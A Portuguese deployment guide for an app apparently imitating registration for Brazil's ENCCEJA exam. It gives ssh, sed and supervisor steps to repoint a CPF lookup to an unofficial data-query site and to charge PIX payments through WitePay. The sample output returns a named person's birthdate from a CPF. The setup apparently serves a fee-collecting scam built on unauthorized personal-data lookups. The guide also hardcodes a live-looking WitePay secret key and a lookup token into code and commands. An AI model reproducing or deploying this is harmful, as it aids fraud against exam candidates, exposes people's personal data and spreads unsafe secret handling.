# 🔧 CORREÇÕES PARA VPS - APIs CPF e PIX

## 🎯 Problema Atual na VPS

- **API CPF:** Usando URL que está fora do ar
- **API PIX:** QR code vazio (problema da conta WitePay)

---

## ✅ CORREÇÕES PARA APLICAR NA VPS

### 1️⃣ Conectar na VPS
```bash
ssh root@SEU_IP_VPS
cd /var/www/encceja
```

### 2️⃣ Fazer backup do arquivo atual
```bash
cp app.py app.py.backup-$(date +%Y%m%d-%H%M%S)
```

### 3️⃣ Editar o arquivo app.py na VPS

#### **Correção 1: API CPF (linha ~1877)**
Localizar:
```python
# Usar a API principal do projeto
url = f"https://zincioinscricaositepdtedaferramenta.site/pagamento/{cpf_numerico}"
```

Substituir por:
```python
# API principal está fora do ar, usar API alternativa funcionando
token = "1285fe4s-e931-4071-a848-3fac8273c55a"
url = f"https://consulta.fontesderenda.blog/cpf.php?token={token}&cpf={cpf_numerico}"
```

#### **Correção 2: Credenciais WitePay (linha ~1698)**
Localizar:
```python
api_key = os.environ.get('WITEPAY_API_KEY')
if not api_key:
    app.logger.error("WITEPAY_API_KEY não encontrada")
    return jsonify({'success': False, 'error': 'API key não configurada'}), 400
```

Substituir por:
```python
# Usar chave WitePay fornecida pelo usuário (credenciais testadas)
api_key = "sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d"
app.logger.info("Usando chave WitePay fornecida pelo usuário")
```

### 4️⃣ Comandos para editar via SSH

#### Opção A: Usando nano
```bash
nano app.py
```
- Use `Ctrl+W` para buscar o texto
- Faça as substituições conforme acima
- `Ctrl+X` → `Y` → `Enter` para salvar

#### Opção B: Usando sed (automatizado)
```bash
# Correção da API CPF
sed -i 's|https://zincioinscricaositepdtedaferramenta.site/pagamento/|https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a\&cpf=|g' app.py

# Correção da chave WitePay
sed -i "s|api_key = os.environ.get('WITEPAY_API_KEY')|api_key = 'sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d'|g" app.py
```

### 5️⃣ Reiniciar aplicação
```bash
sudo supervisorctl restart encceja
sudo supervisorctl status encceja
```

### 6️⃣ Verificar logs
```bash
tail -f /var/log/supervisor/encceja.log
```

---

## 🧪 TESTES APÓS CORREÇÃO

### Teste 1: API CPF
```bash
curl -X GET "http://localhost:5000/consultar-cpf-inscricao?cpf=11111111111"
```

**Resultado esperado:**
```json
{
  "cpf": "11111111111",
  "nome": "GLEDE BERNACCI GOLLUSCIO",
  "dataNascimento": "1938-01-23",
  "sucesso": true
}
```

### Teste 2: API PIX
```bash
curl -X POST "http://localhost:5000/criar-pagamento-pix" \
  -H "Content-Type: application/json" \
  -d '{}'
```

**Resultado esperado (com problema do QR code):**
```json
{
  "success": false,
  "error": "PIX code não gerado - Verificar conta WitePay",
  "debug": {
    "orderId": "or_xxxxx",
    "chargeId": "ch_xxxxx",
    "qrCode": ""
  }
}
```

---

## ⚠️ PROBLEMA DO QR CODE VAZIO

### Diagnóstico:
- **WitePay está criando order e charge com sucesso**
- **QR code retorna vazio na resposta**
- **Isso é um problema da configuração da conta WitePay**

### Soluções para o QR Code:

#### 1️⃣ Contatar suporte WitePay
- **Email/Chat:** Suporte técnico WitePay
- **Pergunta:** "PIX charges criadas com sucesso mas qrCode retorna vazio"
- **Informar:** Chave `sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d`

#### 2️⃣ Verificar configurações na conta
- **Painel WitePay → Configurações**
- **PIX habilitado?**
- **Limites configurados?**
- **Webhooks necessários?**

#### 3️⃣ Testar em ambiente sandbox
- Verificar se o problema existe só em produção
- Comparar resposta sandbox vs produção

---

## 🎯 STATUS FINAL APÓS CORREÇÕES

### ✅ Funcionando:
- API CPF consultando dados corretamente
- WitePay criando orders e charges
- Fluxo de inscrição completo

### ⚠️ Pendente:
- QR code PIX (problema da conta WitePay)
- Contato com suporte WitePay necessário

### 🔧 Para aplicar na VPS:
```bash
# Resumo dos comandos
ssh root@SEU_IP_VPS
cd /var/www/encceja
cp app.py app.py.backup
# Fazer as edições descritas acima
sudo supervisorctl restart encceja
tail -f /var/log/supervisor/encceja.log
```

**A API CPF vai funcionar imediatamente após estas correções. O PIX vai criar orders mas precisa do suporte WitePay para resolver o QR code vazio.**